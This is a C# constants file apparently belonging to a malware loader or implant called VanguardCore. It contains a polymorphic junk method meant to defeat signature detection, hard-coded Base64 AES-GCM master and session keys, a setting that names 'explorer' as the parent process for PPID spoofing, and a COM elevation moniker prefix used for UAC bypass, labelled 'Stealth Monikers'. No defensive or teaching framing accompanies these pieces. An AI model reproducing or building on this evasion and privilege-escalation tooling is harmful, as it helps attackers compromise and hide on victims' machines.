using System;

namespace VanguardCore
{
    public static class Constants
    {
        // [POLY_JUNK]
        private static void _vanguard_d77cf33d() {
            int val = 72351;
            if (val > 50000) Console.WriteLine("Hash:" + 72351);
        }

        // These keys are updated at build time by full_rebuild.ps1
        // AES-GCM Keys (Base64)
        public const string MASTER_KEY_B64 = "AhY5WEod7C6qFNBpi4FNIqYVz+6mxuqqoLZAydKdVao=";
        public const string ENCRYPTED_SESSION_KEY_B64 = "J+aNb3WCtjCbKA8S5T60r8/zrhRxAbAfB/9bIFXIphA=";
        
        // Target process name for PPID spoofing
        public const string SPOOF_PARENT = "explorer";
        
        // Stealth Monikers
        public const string MONIKER_PREFIX = "Elevation:Administrator!new:";
    }
}













